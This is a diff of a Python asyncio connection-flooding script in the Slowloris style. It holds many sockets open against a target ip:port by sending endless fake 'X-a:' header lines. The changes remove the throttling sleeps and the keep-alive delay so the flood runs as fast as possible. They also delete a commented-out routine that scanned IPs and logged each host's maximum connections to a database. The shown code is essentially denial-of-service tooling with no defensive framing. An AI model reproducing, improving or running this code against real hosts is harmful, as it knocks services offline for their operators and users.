@@ -128,28 +128,18 @@ async def keeping_active():
 
 	while keep_alive:
 
-		i = 0
-
 		print('{} sockets on {}:{} Still alive..'.format(len(listOfSockets), ip, port))
 
 		for s in listOfSockets:
-			if listOfSockets.index(s) % 100 == 0:
-				await asyncio.sleep(0.01)
-
 			try:
 				s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
 			except socket.error:
-				i += 1
 				listOfSockets.remove(s)
+				# socketInit()
+				# listOfSockets.append(s)
 				continue
-				
-		for x in range(i):
-			print(x)
-			s = socketInit()
-			listOfSockets.append(s)
-				
 		
-		await asyncio.sleep(5)
+		await asyncio.sleep(0)
 
 	# print('AA')
 	# print('{} sockets Still alive..'.format(len(listOfSockets)))
@@ -178,13 +168,14 @@ async def connection():
 
 	keep_alive = True
 
+	# for _ in range(quantityOfSockets):
 	while len(listOfSockets) < quantityOfSockets:
 		try:
 			s = socketInit()
 
-			if len(listOfSockets) % 50 == 0:
+			if len(listOfSockets) % 100 == 0:
 				print(len(listOfSockets))
-				await asyncio.sleep(0.01)
+				await asyncio.sleep(0)
 
 			# print(s)
 		except socket.timeout:
@@ -263,58 +254,3 @@ if __name__ == "__main__":
 
 
 	cursor.close()
-
-
-
-	# print('Scaning...')
-	# counter = 0
-	# db_txt = open('db.txt', 'a+')
-
-	# while True:
-	# 	if counter == 0:
-	# 		db_txt.close()
-	# 		conn.commit()
-	# 		db_txt = open('db.txt', 'a+')
-
-	# 	try:
-	# 		# ip = rand_ip()
-	# 		ip = '127.0.0.1'
-
-	# 		ports = portsCheck(ip)
-
-	# 		for p in ports:
-	# 			port = p
-	# 			print('Scaning IP: {} Port: {}'.format(ip, port))
-	# 			count = connection(ip, port, maximum_sockets)
-	# 			print('End of {}:{} scanning'.format(ip, port))
-	# 			if count == maximum_sockets:
-	# 				count = '>'+str(count) 
-	# 			try:
-	# 				cursor.execute("INSERT INTO checked_ip (ip_address, port, maximum_connections) VALUES (?, ?, ?)", (ip, str(port), str(count)))
-	# 				db_txt.write('{} {} {}'.format(ip, port, count))
-	# 				print('IP - {}, Port - {}, Conn - {}'.format(ip, port, count))
-	# 				conn.commit()
-	# 			except:
-	# 				pass
-
-	# 	except KeyboardInterrupt:
-			
-	# 		conn.commit()
-			
-	# 		cursor.execute("SELECT * from checked_ip")
-	# 		results = cursor.fetchall()
-	# 		for i in results:
-	# 			ip, port, conn = i
-	# 			print('{} - {} - {}'.format(ip, port, conn))
-	# 		cursor.close()
-	# 		break
-	# 	except:
-	# 		print(traceback.format_exc())
-	# 		continue
-	# 	if counter != 10:
-	# 		counter += 1
-	# 	else:
-	# 		counter = 0
-
-
-
